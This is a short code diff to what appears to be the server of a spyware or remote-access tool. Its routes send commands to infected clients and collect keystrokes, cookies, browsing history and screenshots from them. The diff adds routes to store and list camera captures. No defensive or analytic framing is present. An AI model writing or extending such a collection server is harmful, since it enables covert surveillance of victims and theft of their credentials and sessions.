@@ -23,9 +23,12 @@ app.post(`/clients/send-command`, clientController.sendCommand)
 
 // Collector routes
 app.get('/collector/screenshots', collectorController.listScreenshots)
+app.get('/collector/camera', collectorController.listCameraCaptures)
+
 app.post('/collector/key-logger', collectorController.saveKeys);
 app.post('/collector/cookies', collectorController.saveCookies)
 app.post('/collector/history', collectorController.saveHistory)
 app.post('/collector/screenshot', collectorController.saveScreenshot)
+app.post('/collector/camera', collectorController.saveCameraCapture)
 
 export const http_server = http.createServer(app);
